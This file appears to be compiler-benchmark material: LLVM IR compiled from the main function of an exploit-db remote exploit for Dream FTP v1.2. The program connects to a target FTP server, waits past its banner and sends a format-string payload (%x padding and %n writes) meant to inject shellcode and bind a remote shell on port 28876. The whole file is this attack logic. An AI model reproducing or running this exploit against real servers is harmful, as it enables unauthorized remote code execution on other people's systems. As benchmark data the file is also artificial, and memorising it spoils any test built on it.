; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_823.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_823.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [21 x i8] c"Usage: %s IP [PORT]\0A\00", align 1
@.str.1 = private unnamed_addr constant [557 x i8] c"- Nightmare --------------------------------------------------\0A  Dream FTP v1.2 formatstring exploit.\0A  Written by SkyLined <SkyLined@EduP.TUDelft.nl>.\0A  Credits for the vulnerability go to badpack3t\0A                           <badpack3t@security-protocols.com>.\0A  Shellcode based on work by H D Moore (www.metasploit.com).\0A  Greets to everyone at 0dd and #netric.\0A  (K)(L)(F) for Suzan.\0A\0A  Binds a shell at %s:28876 if successfull.\0A  Tested with: WIN2KEN/Dream FTP v1.2 (1.02/TryFTP 1.0.0.1)\0A--------------------------------------------------------------\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [3 x i8] c"r+\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [34 x i8] c"\0A[-] Connection to %s:%d failed: \00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"\0A[+] Connected to %s:%d.\0A\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"  --> %s\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"220-\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"\0A[+] Sending exploit string...\0A\00", align 1
@.str.8 = private unnamed_addr constant [58 x i8] c"\EB)%%8x%%8x%%8x%%8x%%8x%%8x%%8x%%8x%%%dd%%n%%n@@@@@@@@%s\0D\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [89 x i8] c"\0A[+] Done, allow a few seconds on a slow target before you can\0A    connect to %s:28876.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i32, align 4
  %12 = alloca [1024 x i8], align 16
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  store i32 21, i32* %11, align 4
  %13 = load i32, i32* %5, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %18, label %15

15:                                               ; preds = %3
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 3
  br i1 %17, label %18, label %24

18:                                               ; preds = %15, %3
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %15
  %25 = load i32, i32* %5, align 4
  %26 = icmp eq i32 %25, 3
  br i1 %26, label %27, label %32

27:                                               ; preds = %24
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %11, align 4
  br label %32

32:                                               ; preds = %27, %24
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([557 x i8], [557 x i8]* @.str.1, i64 0, i64 0), i8* %35)
  %37 = load i32, i32* @AF_INET, align 4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %37, i32* %38, align 4
  %39 = load i32, i32* %11, align 4
  %40 = call i32 @htons(i32 %39)
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %40, i32* %41, align 4
  %42 = load i8**, i8*** %6, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @inet_addr(i8* %44)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %46, i32 0, i32 0
  store i32 %45, i32* %47, align 4
  %48 = load i32, i32* @AF_INET, align 4
  %49 = load i32, i32* @SOCK_STREAM, align 4
  %50 = load i32, i32* @IPPROTO_TCP, align 4
  %51 = call i32 @socket(i32 %48, i32 %49, i32 %50)
  store i32 %51, i32* %8, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %62, label %53

53:                                               ; preds = %32
  %54 = load i32, i32* %8, align 4
  %55 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 12)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %62, label %58

58:                                               ; preds = %53
  %59 = load i32, i32* %8, align 4
  %60 = call i32* @fdopen(i32 %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32* %60, i32** %9, align 8
  %61 = icmp eq i32* %60, null
  br i1 %61, label %62, label %73

62:                                               ; preds = %58, %53, %32
  %63 = load i32, i32* @stderr, align 4
  %64 = sext i32 %63 to i64
  %65 = inttoptr i64 %64 to i32*
  %66 = load i8**, i8*** %6, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = load i32, i32* %11, align 4
  %70 = call i32 (i32*, i8*, ...) @fprintf(i32* %65, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i8* %68, i32 %69)
  %71 = call i32 @perror(i32* null)
  %72 = call i32 @exit(i32 -1) #3
  unreachable

73:                                               ; preds = %58
  %74 = load i8**, i8*** %6, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %11, align 4
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %76, i32 %77)
  br label %79

79:                                               ; preds = %84, %73
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %81 = load i32*, i32** %9, align 8
  %82 = call i8* @fgets(i8* %80, i32 1024, i32* %81)
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i8* %82)
  br label %84

84:                                               ; preds = %79
  %85 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %86 = call i8* @strstr(i8* %85, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %87 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %88 = icmp eq i8* %86, %87
  br i1 %88, label %79, label %89

89:                                               ; preds = %84
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %91 = load i32*, i32** %9, align 8
  %92 = load i8*, i8** @shellcode, align 8
  %93 = call i32 (i32*, i8*, ...) @fprintf(i32* %91, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.8, i64 0, i64 0), i32 3957680, i8* %92)
  %94 = load i32*, i32** %9, align 8
  %95 = call i32 @fflush(i32* %94)
  %96 = load i32, i32* %8, align 4
  %97 = call i32 @close(i32 %96)
  %98 = load i8**, i8*** %6, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 1
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i64 0, i64 0), i8* %100)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32* @fdopen(i32, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @perror(i32*) #1

declare dso_local i8* @fgets(i8*, i32, i32*) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @fflush(i32*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
